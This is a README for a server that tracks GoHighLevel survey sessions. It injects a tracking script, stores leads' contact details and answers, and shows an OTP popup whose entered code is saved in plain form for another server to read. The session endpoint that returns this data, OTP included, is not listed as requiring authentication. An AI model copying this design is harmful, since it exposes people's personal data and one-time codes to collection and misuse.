# GHL Survey Mirror Server

Real-time session tracking for GHL (GoHighLevel) surveys with DynamoDB persistence, heartbeat monitoring, OTP popup, and a polling API for your automation server.

**Live:** `https://mir.agentemp.com` · Port `9000` · PM2 name: `mirror-survey`

---

## Quick Start

```bash
# 1. Install dependencies
npm install

# 2. Copy .env and fill in values
cp .env.example .env

# 3. Create DynamoDB table (run ONCE only)
npm run setup-table

# 4. Start
npm start        # production
npm run dev      # development (nodemon)
```

---

## Inject Tracker into GHL Survey

Add this to the GHL survey page (head or body custom code):

```html
<script src="https://mir.agentemp.com/tracker.js" defer></script>
```

The script auto-initializes, fetches slide config, and handles all session tracking.

---

## How It Works

1. Lead opens survey → `tracker.js` is injected
2. Tracker fetches `GET /tracker-config` → receives slide field selectors
3. Email captured on slide 1 → `POST /api/session/init` → session created in DynamoDB
4. Mirror Server calls Other Server `POST /session-started` (fire & forget) `{ sessionId, email, phone }`
5. On every slide change → `POST /api/session/slide-data` with fields from the previous slide
6. Every 30s → `POST /api/session/heartbeat` (no heartbeat for 20min = session auto-marked exited)
7. On tab close → `POST /api/session/exit`
8. Other Server decides to show OTP → calls our `POST /internal/otp-trigger`
9. Tracker polls `GET /session/:id/otp-status` → sees `pending` → shows full-screen blur OTP modal
10. Lead enters OTP → `POST /api/session/otp-submit` → saved to `otp.value` in DynamoDB
11. Other Server polls `GET /session/:id` → reads `otp.value` → validates on their side
12. Other Server calls our `PUT /internal/otp-status` `{ status: "valid" | "invalid" }`
13. Tracker polls → sees result → closes modal (valid) or shows error and retries (invalid, max 3 attempts)
14. Session marked `completed` when lead reaches last slide OR Other Server saves `plan_id`

---

## Environment Variables

| Variable | Description | Default |
|---|---|---|
| `PORT` | Server port | `9000` |
| `NODE_ENV` | Environment | `production` |
| `SERVER_PUBLIC_URL` | Public URL injected into `tracker.js` | — |
| `AWS_REGION` | AWS region | `us-east-1` |
| `AWS_ACCESS_KEY_ID` | AWS access key | — |
| `AWS_SECRET_ACCESS_KEY` | AWS secret key | — |
| `DYNAMODB_SESSIONS_TABLE` | DynamoDB table name | `Survey-MirrorSessions` |
| `HEARTBEAT_INTERVAL_MS` | Client heartbeat interval (ms) | `30000` |
| `STALE_SESSION_MINUTES` | Minutes no heartbeat = exited | `20` |
| `OTHER_SERVER_BASE_URL` | Base URL of automation server | — |
| `OTHER_SERVER_SESSION_INIT_PATH` | Path notified on session start | `/api/mirror/session/start` |
| `CORS_ALLOWED_ORIGINS` | Comma-separated allowed origins | — |
| `INTERNAL_API_SECRET` | Shared secret for `/internal/*` calls | — |

---

## API Reference

### Survey Client APIs (`survey-tracker.js` → Mirror Server)

| Method | Path | Body | Description |
|---|---|---|---|
| POST | `/api/session/init` | `{email, phone}` | Create session (once email captured) |
| POST | `/api/session/slide-data` | `{sessionId, slideName, fields}` | Save previous slide fields |
| POST | `/api/session/heartbeat` | `{sessionId}` | Keep session alive |
| POST | `/api/session/exit` | `{sessionId}` | Mark session exited |
| POST | `/api/session/otp-submit` | `{sessionId, otp}` | Save OTP value to DB |
| GET  | `/api/session/:id` | — | Full session (for Other Server polling) |
| GET  | `/api/session/:id/otp-status` | — | Lightweight OTP status poll |

### Internal APIs (Other Server → Mirror Server)

All require header: `x-internal-secret: <INTERNAL_API_SECRET>`

| Method | Path | Body | Description |
|---|---|---|---|
| POST | `/internal/otp-trigger` | `{sessionId}` | Show OTP popup on survey |
| PUT  | `/internal/otp-status` | `{sessionId, status}` | Set OTP result (`valid`/`invalid`) |
| POST | `/internal/session/:id/plan` | `{planId}` | Save plan, mark session completed |
| GET  | `/internal/session/:id` | — | Read session with stale-check |
| GET  | `/internal/session/by-email/:email` | — | Find sessions by email |

### Utility

| Method | Path | Description |
|---|---|---|
| GET | `/tracker-config` | Slide field selector map (JSON) |
| GET | `/tracker.js` | Client script with `SERVER_URL` injected |
| GET | `/health` | Health check |

---

## What Other Server Must Implement

**Just 1 endpoint:**

| Endpoint | Payload |
|---|---|
| `POST /api/mirror/session/start` | `{ sessionId, email, phone }` |

They call back our 2 internal endpoints (`/internal/otp-trigger` and `PUT /internal/otp-status`) and poll `GET /session/:id` for all field data.

---

## Session Data Shape (DynamoDB)

```json
{
  "sessionId":      "uuid-v4",
  "email":          "lead@example.com",
  "phone":          "+15551234567",
  "status":         "active | exited | completed",
  "currentSlide":   "slide3",
  "slides": {
    "slide1": { "firstName": "John", "email": "...", "phone": "..." },
    "slide2": { "address": "...", "city": "..." }
  },
  "otp": {
    "status":   "none | pending | valid | invalid",
    "attempts": 0,
    "value":    "123456"
  },
  "planId":         null,
  "createdAt":      1721000000000,
  "updatedAt":      1721000000000,
  "lastHeartbeat":  1721000000000,
  "ttl":            1721604800
}
```

---

## Editing Slide Fields

All selectors live in **`config/slides.js`** only.

- Add a field → add it to the slide map
- Remove a field → delete it from the slide map
- Move a field → cut/paste between slide objects

No other file needs to change.

---

## Session Lifecycle

| Status | Meaning |
|---|---|
| `active` | Running, heartbeats received |
| `exited` | Tab closed or no heartbeat for 20+ min |
| `completed` | Last slide reached or `plan_id` saved |

---

## OTP Modal Behaviour

1. Other Server sends OTP to lead → calls `POST /internal/otp-trigger`
2. Survey tracker polls `/otp-status` → sees `pending` → shows full-screen blur modal
3. Lead enters OTP → saved to `otp.value` in DB
4. Other Server sees OTP in DB → validates → calls `PUT /internal/otp-status`
5. **Valid** → modal closes, survey resumes
6. **Invalid** (attempt 1–2) → shows error with lead's email/phone, clears field, resets to `pending`, allows retry
7. **Invalid** (attempt 3) → shows final error, closes modal, survey resumes anyway

---

## Deploy

```bash
./deploy.sh           # redeploy (files + npm install + pm2 restart)
./deploy.sh --setup   # first-time setup (Node, Nginx, PM2, optional SSL)
```
